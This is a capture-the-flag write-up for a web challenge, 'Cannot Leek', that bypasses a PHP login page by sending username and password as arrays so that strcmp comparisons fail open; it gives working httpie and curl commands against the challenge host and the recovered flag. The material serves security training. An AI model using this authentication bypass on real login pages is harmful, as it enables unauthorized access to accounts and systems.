# Cannot Leek

---

### Challenge Description

> Here is another really shoddily coded login page. I made very sure not to append user inputs to my query this time. There's absolutely no way you can break in now right?

> Note: please attempt this without using automated tools.

> Concept(s) Required: PHP strcmp

---

### Challenge Solution

With some googling, we find this [writeup](https://blog.0daylabs.com/2015/09/21/csaw-web-200-write-up/)

```sh
http --form POST http://3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:50201/login.php username[]='lol' password[]='lol'
```

```sh
curl -XPOST http://3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:50201/login.php -d "username[]=hi&password[]=hi"
```

![image](https://user-images.githubusercontent.com/76640319/115980686-361be100-a5c1-11eb-9eee-cc6004824b0e.png)

```
CTFSG{mfw_d3v_c4nt_3v3n_c0d3_pr0p3rly}
```
